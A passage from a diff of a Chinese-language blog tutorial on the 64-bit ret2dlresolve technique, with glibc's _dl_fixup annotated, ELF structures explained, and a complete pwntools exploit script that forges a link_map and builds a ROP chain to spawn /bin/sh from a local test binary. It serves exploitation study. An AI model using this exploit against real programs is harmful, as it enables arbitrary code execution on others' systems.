&amp;l-&gt;l_versions[ndx];<br>	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>	    version = <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">	 we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	&#123;<br>	  THREAD_GSCOPE_SET_FLAG ();<br>	  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>	&#125;<br><br>      RTLD_ENABLE_FOREIGN_CALL;<br>	<span class="hljs-comment">// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	THREAD_GSCOPE_RESET_FLAG ();<br><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">	 offset.  */</span><br>      <span class="hljs-comment">// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value</span><br>      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123; <br>      <span class="hljs-comment">// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value,我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value</span><br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">	 address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br>  <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_fixup (<span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg) <span class="hljs-comment">// 第一个参数link_map，也就是got[1]</span><br>&#123;<br>    <span class="hljs-comment">// 获取link_map中存放DT_SYMTAB的地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">// 获取link_map中存放DT_STRTAB的地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br>	<span class="hljs-comment">// reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体</span><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 根据重定位结构体的r_info得到symtab表中对应的结构体</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>    <br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); <span class="hljs-comment">// 检查r_info的最低位是不是7</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">// 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码</span><br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-comment">// 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码</span><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>      <span class="hljs-comment">// 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，由于我们一般伪造的symtab位于bss段，就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段，第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。</span><br>	  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>	  version = &amp;l-&gt;l_versions[ndx];<br>	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>	    version = <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">	 we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	&#123;<br>	  THREAD_GSCOPE_SET_FLAG ();<br>	  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>	&#125;<br><br>      RTLD_ENABLE_FOREIGN_CALL;<br>	<span class="hljs-comment">// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	THREAD_GSCOPE_RESET_FLAG ();<br><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">	 offset.  */</span><br>      <span class="hljs-comment">// 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value</span><br>      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123; <br>      <span class="hljs-comment">// 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value,我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value</span><br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">	 address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br>  <span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);<br>&#125;<br><br><br></code></pre></td></tr></table></figure></div>
 
 <p>因此64位下我们需要控制link_map中l-&gt;addr 和sym中st_value<br>64位下sym的结构体</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf64_Word    st_name;        <span class="hljs-comment">/* Symbol name (string tbl index) */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;        <span class="hljs-comment">/* Symbol type and binding */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;       <span class="hljs-comment">/* Symbol visibility */</span>  <br>  Elf64_Section st_shndx;       <span class="hljs-comment">/* Section index */</span>  <br>  Elf64_Addr    st_value;       <span class="hljs-comment">/* Symbol value */</span>  <br>  Elf64_Xword   st_size;        <span class="hljs-comment">/* Symbol size */</span>  <br>&#125; Elf64_Sym; <br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf64_Word    st_name;        <span class="hljs-comment">/* Symbol name (string tbl index) */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;        <span class="hljs-comment">/* Symbol type and binding */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;       <span class="hljs-comment">/* Symbol visibility */</span>  <br>  Elf64_Section st_shndx;       <span class="hljs-comment">/* Section index */</span>  <br>  Elf64_Addr    st_value;       <span class="hljs-comment">/* Symbol value */</span>  <br>  Elf64_Xword   st_size;        <span class="hljs-comment">/* Symbol size */</span>  <br>&#125; Elf64_Sym; <br><br></code></pre></td></tr></table></figure></div>
 
 <p>其中</p>
 <ul>
@@ -294,473 +487,435 @@
 </ul>
 <p>所以如果将一个函数的got表地址-0x8作为sym的首地址，那么st_value就是got表地址，st_other也不为0</p>
 <p>64位link_map的源码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> &#123;</span><br>    Elf64_Addr l_addr;<br>    <span class="hljs-type">char</span> *l_name;<br>    Elf64_Dyn *l_ld;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_real</span>;</span><br>    Lmid_t l_ns;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">libname_list</span> *<span class="hljs-title">l_libname</span>;</span><br>    Elf64_Dyn *l_info[<span class="hljs-number">76</span>];  <span class="hljs-comment">//l_info 里面包含的就是动态链接的各个表的信息</span><br>    ...<br>    <span class="hljs-type">size_t</span> l_tls_firstbyte_offset;<br>    <span class="hljs-type">ptrdiff_t</span> l_tls_offset;<br>    <span class="hljs-type">size_t</span> l_tls_modid;<br>    <span class="hljs-type">size_t</span> l_tls_dtor_count;<br>    Elf64_Addr l_relro_addr;<br>    <span class="hljs-type">size_t</span> l_relro_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> l_serial;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auditstate</span> <span class="hljs-title">l_audit</span>[];</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> &#123;</span><br>    Elf64_Addr l_addr;<br>    <span class="hljs-type">char</span> *l_name;<br>    Elf64_Dyn *l_ld;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_real</span>;</span><br>    Lmid_t l_ns;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">libname_list</span> *<span class="hljs-title">l_libname</span>;</span><br>    Elf64_Dyn *l_info[<span class="hljs-number">76</span>];  <span class="hljs-comment">//l_info 里面包含的就是动态链接的各个表的信息</span><br>    ...<br>    <span class="hljs-type">size_t</span> l_tls_firstbyte_offset;<br>    <span class="hljs-type">ptrdiff_t</span> l_tls_offset;<br>    <span class="hljs-type">size_t</span> l_tls_modid;<br>    <span class="hljs-type">size_t</span> l_tls_dtor_count;<br>    Elf64_Addr l_relro_addr;<br>    <span class="hljs-type">size_t</span> l_relro_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> l_serial;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auditstate</span> <span class="hljs-title">l_audit</span>[];</span><br>&#125;<br><br></code></pre></td></tr></table></figure></div>
 
 <p>.dynamic对应l_info中的内容</p>
 <p>因此我们伪造link_map表时，首先伪造l_info中的3个指针<br>DT_STRTAB指针，DT_SYMTAB指针，DT_JMPREL指针<br>后面控制l_addr的值</p>
 <p>然后伪造指向的三个elf64_dyn即可，dynstr只需要指向一个可读的地方，因为并没有用到</p>
 <p>64位重定位表项与32位不同</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addr        r_offset;                <span class="hljs-comment">/* Address */</span><br>  Elf64_Xword        r_info;                        <span class="hljs-comment">/* Relocation type and symbol index */</span><br>  Elf64_Sxword        r_addend;                <span class="hljs-comment">/* Addend */</span><br>&#125; Elf64_Rela;<br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addr        r_offset;                <span class="hljs-comment">/* Address */</span><br>  Elf64_Xword        r_info;                        <span class="hljs-comment">/* Relocation type and symbol index */</span><br>  Elf64_Sxword        r_addend;                <span class="hljs-comment">/* Addend */</span><br>&#125; Elf64_Rela;<br><br></code></pre></td></tr></table></figure></div>
 
 <p>上面几个类型都为64位，因此结构体大小为24字节</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829241/2025/08/deb315a7fb7af8797752bdd0d207def5.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829241/2025/08/deb315a7fb7af8797752bdd0d207def5.png"
+                     
+                ></p>
 <p>另外就是，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0</p>
 <p>接下来我们伪造link_map，know_func_ptr为已解析函数的got表地址，offset为system函数与这个函数在libc上的偏移</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-number">2</span> <br> <span class="hljs-number">3</span> s=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">4</span> elf=ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br> <span class="hljs-number">5</span> libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br> <span class="hljs-number">6</span> <br> <span class="hljs-number">7</span> plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br> <span class="hljs-number">8</span> l_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br> <span class="hljs-number">9</span> st_value=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-number">10</span> <br><span class="hljs-number">11</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_fake_link_map</span>(<span class="hljs-params">fake_link_map_addr,l_addr,st_value</span>):<br><span class="hljs-number">12</span>     <span class="hljs-comment">#the address of each fake pointer</span><br><span class="hljs-number">13</span>     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)<br><span class="hljs-number">14</span>     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+<span class="hljs-number">0x8</span>)<br><span class="hljs-number">15</span>     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+<span class="hljs-number">0x18</span>)<br><span class="hljs-number">16</span>     <span class="hljs-comment">#fake structure</span><br><span class="hljs-number">17</span>     fake_Elf64_Dyn_SYM =p64(<span class="hljs-number">0</span>)+p64(st_value-<span class="hljs-number">0x8</span>)<br><span class="hljs-number">18</span>     fake_Elf64_Dyn_JMPREL = p64(<span class="hljs-number">0</span>)+p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)<br><span class="hljs-number">19</span>       <span class="hljs-comment"># JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x28</span><br><span class="hljs-number">20</span>     r_offset = fake_link_map_addr - l_addr<br><span class="hljs-number">21</span>     fake_Elf64_rela =p64(r_offset)+p64(<span class="hljs-number">0x7</span>)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">22</span>     <span class="hljs-comment">#fake_link_map</span><br><span class="hljs-number">23</span>     fake_link_map =p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<span class="hljs-comment"># 0x8</span><br><span class="hljs-number">24</span>     fake_link_map+=fake_Elf64_Dyn_SYM   <span class="hljs-comment"># 0x18  </span><br><span class="hljs-number">25</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL<span class="hljs-comment"># 0x28</span><br><span class="hljs-number">26</span>     fake_link_map+=fake_Elf64_rela      <span class="hljs-comment"># 0x40</span><br><span class="hljs-number">27</span>     fake_link_map+=<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x28</span>         <span class="hljs-comment"># 0x68</span><br><span class="hljs-number">28</span>     fake_link_map+=fake_Elf64_Dyn_STR_addr     <span class="hljs-comment"># STRTAB pointer,0x70</span><br><span class="hljs-number">29</span>     fake_link_map+=fake_Elf64_Dyn_SYM_addr     <span class="hljs-comment"># SYMTAB pointer,0x78</span><br><span class="hljs-number">30</span>     fake_link_map+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 0xf8</span><br><span class="hljs-number">31</span>     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL pointer    </span><br><span class="hljs-number">32</span>     <span class="hljs-keyword">return</span> fake_link_map<br><span class="hljs-number">33</span> <br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> pop_rdi_ret = <span class="hljs-number">0x401223</span><br><span class="hljs-number">36</span> pop_rsi_r15_ret = <span class="hljs-number">0x401221</span><br><span class="hljs-number">37</span> ret = <span class="hljs-number">0x4011BE</span><br><span class="hljs-number">38</span> fake_link_map_addr = <span class="hljs-number">0x404050</span><br><span class="hljs-number">39</span> <br><span class="hljs-number">40</span> <br><span class="hljs-number">41</span> fake_link_map=get_fake_link_map(fake_link_map_addr,l_addr,st_value)<br><span class="hljs-number">42</span> <br><span class="hljs-number">43</span> payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_r15_ret) + p64(fake_link_map_addr) + p64(<span class="hljs-number">0</span>) + p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br><span class="hljs-number">44</span> payload += p64(ret) + p64(pop_rdi_ret) + p64(fake_link_map_addr+<span class="hljs-number">0x78</span>) + p64(plt0+<span class="hljs-number">6</span>) + p64(fake_link_map_addr) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-number">45</span> payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-number">46</span> <br><span class="hljs-number">47</span> s.sendafter(<span class="hljs-string">&quot;something:\n&quot;</span>,payload)<br><span class="hljs-number">48</span> <br><span class="hljs-number">49</span> s.send(fake_link_map)<br><span class="hljs-number">50</span> <br><span class="hljs-number">51</span> s.interactive()<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> 